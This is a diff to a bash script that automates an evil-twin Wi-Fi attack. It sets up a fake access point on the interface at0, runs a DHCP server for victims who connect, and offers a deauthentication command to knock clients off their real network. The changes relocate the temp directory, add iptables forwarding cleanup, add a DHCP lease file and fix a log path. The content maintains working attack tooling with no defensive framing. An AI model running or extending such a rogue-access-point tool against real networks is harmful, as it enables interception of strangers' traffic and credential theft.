@@ -24,7 +24,7 @@ BOLD_WHITE='\e[1;37m'       # white
 DEFAULT_FOREGROUND_COLOR='\e[39m'   # Default foreground color.
 
 # Variables.
-TMP_DIR="$(cd . && pwd)/tmp"
+TMP_DIR="/tmp/evil-twin-automated"
 
 # Real LAN network variables.
 IP_SUBNET=192.168.1.0
@@ -644,7 +644,10 @@ cleanup() {
         ip link set "${iface}" down 2>/dev/null || true
         iw dev "${iface}" del 2>/dev/null || true
     done
+    iptables -D FORWARD -i at0 -o "${lan}" -j ACCEPT 2>/dev/null || true
+    iptables -D FORWARD -i "${lan}" -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
     iptables -t nat -D POSTROUTING -o "${lan}" -j MASQUERADE 2>/dev/null || true
+    rm -rf "${TMP_DIR}" 2>/dev/null || true
     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Done.${WHITE}"
 }
 
@@ -756,7 +759,8 @@ main() {
                     fi
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
-                    run_background "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
+                    touch "${TMP_DIR}/dhcpd.leases"
+                    run_background "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" -lf \"${TMP_DIR}/dhcpd.leases\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
 
                     echo ""
                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
@@ -765,7 +769,7 @@ main() {
                     else
                         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Internet access: ${BOLD_RED}Disabled${WHITE}"
                     fi
-                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check logs: ${BOLD_CYAN}./tmp/{airbase-ng,dhcpd,aireplay-ng}.log${WHITE}"
+                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check logs: ${BOLD_CYAN}${TMP_DIR}/{airbase-ng,dhcpd,aireplay-ng}.log${WHITE}"
                     echo ""
                     echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Commands: ${BOLD_YELLOW}[d]${GREEN}eauth ${WHITE}| ${BOLD_YELLOW}[q]${GREEN}uit${WHITE}"
                     deauth_running=false
